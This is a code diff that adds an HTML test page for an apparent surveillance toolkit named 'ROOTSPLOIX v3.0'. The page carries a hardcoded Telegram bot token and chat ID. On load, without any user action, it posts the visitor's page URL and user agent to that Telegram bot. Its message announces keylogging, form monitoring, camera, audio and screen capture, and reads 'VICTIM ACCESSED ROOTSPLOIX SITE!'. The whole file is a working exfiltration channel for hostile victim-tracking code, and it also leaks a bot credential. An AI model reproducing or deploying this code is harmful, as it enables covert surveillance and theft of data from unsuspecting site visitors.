@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>TELEGRAM CHECK</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; text-align: center; }
+        .test-btn { background: #ff0000; color: #fff; padding: 20px; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; margin: 10px; }
+        .result { margin: 20px; padding: 15px; border: 1px solid #00ff00; }
+    </style>
+</head>
+<body>
+    <h1>🔥💀 TELEGRAM CHECK 💀🔥</h1>
+    
+    <button class="test-btn" onclick="testTelegramDirect()">
+        📡 TEST TELEGRAM DIRECT
+    </button>
+    
+    <button class="test-btn" onclick="simulateMainSite()">
+        🎯 SIMULATE MAIN SITE LOAD
+    </button>
+    
+    <div id="results" class="result">
+        Ready to test...
+    </div>
+    
+    <script>
+        function updateResult(msg) {
+            const results = document.getElementById('results');
+            results.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
+        }
+        
+        // Test direct telegram
+        async function testTelegramDirect() {
+            updateResult('🔥 Testing direct telegram...');
+            
+            try {
+                const BOT_TOKEN = '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM';
+                const CHAT_ID = '6633612153';
+                
+                const testMsg = `🔥💀 TELEGRAM DIRECT TEST! 💀🔥
+
+BAK BAKALIM BOTA GİDEN MESAJ VARMI - DIRECT TEST!
+
+🎯 Test Type: Direct API Call
+🕒 Time: ${new Date().toLocaleString()}
+📡 Chat ID: ${CHAT_ID}
+
+💀 ROOTSPLOIX TELEGRAM CHECK!`;
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: testMsg
+                    })
+                });
+                
+                if (response.ok) {
+                    updateResult('✅ Direct telegram: SUCCESS!');
+                } else {
+                    updateResult(`❌ Direct telegram: FAILED ${response.status}`);
+                }
+                
+            } catch (error) {
+                updateResult(`❌ Direct telegram error: ${error.message}`);
+            }
+        }
+        
+        // Simulate main site behavior
+        async function simulateMainSite() {
+            updateResult('🎯 Simulating main site behavior...');
+            
+            try {
+                // Create ROOTSPLOIX_SESSION like main site
+                const ROOTSPLOIX_SESSION = {
+                    id: `rs_${Date.now()}_${Math.random().toString(36).substr(2, 16)}`,
+                    startTime: Date.now(),
+                    statistics: {
+                        keystrokeCount: 0,
+                        clickCount: 0,
+                        cameraCount: 0,
+                        audioCount: 0
+                    }
+                };
+                
+                // Create TelegramAPI class like main site
+                class TelegramAPI {
+                    constructor() {
+                        this.botToken = '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM';
+                        this.chatId = '6633612153';
+                        this.apiUrl = 'https://api.telegram.org/bot' + this.botToken;
+                    }
+                    
+                    async sendMessage(message) {
+                        const url = `${this.apiUrl}/sendMessage`;
+                        const params = new URLSearchParams({
+                            chat_id: this.chatId,
+                            text: message
+                        });
+                        
+                        try {
+                            const response = await fetch(url, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                                body: params.toString()
+                            });
+                            
+                            return response.ok;
+                        } catch (error) {
+                            console.log('Telegram error:', error);
+                            return false;
+                        }
+                    }
+                }
+                
+                // Test like main site startup
+                const telegram = new TelegramAPI();
+                
+                const startupMsg = `🔥💀 ROOTSPLOIX v3.0 STARTED! 💀🔥
+
+ŞUAN ATMIYO DEĞİL - OTOMATİK BAŞLATTI!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🌍 Target Site: ${window.location.href}
+📱 User Agent: ${navigator.userAgent.substring(0, 100)}...
+🕒 Start Time: ${new Date().toLocaleString()}
+
+🛡️ ACTIVE MODULES:
+✅ Keylogger: LISTENING
+✅ Mouse Tracker: ACTIVE
+✅ Form Monitor: WATCHING
+✅ Camera Access: READY
+✅ Audio Recording: STANDBY
+✅ Screen Capture: READY
+
+💀 VICTIM ACCESSED ROOTSPLOIX SITE!
+🔥 SURVEILLANCE INITIATED!`;
+                
+                const success = await telegram.sendMessage(startupMsg);
+                
+                if (success) {
+                    updateResult('✅ Main site simulation: SUCCESS!');
+                } else {
+                    updateResult('❌ Main site simulation: FAILED');
+                }
+                
+            } catch (error) {
+                updateResult(`❌ Main site simulation error: ${error.message}`);
+            }
+        }
+        
+        // Auto test on load
+        setTimeout(() => {
+            updateResult('🚀 Auto-testing...');
+            testTelegramDirect();
+            
+            setTimeout(() => {
+                simulateMainSite();
+            }, 2000);
+        }, 1000);
+    </script>
+</body>
+</html>
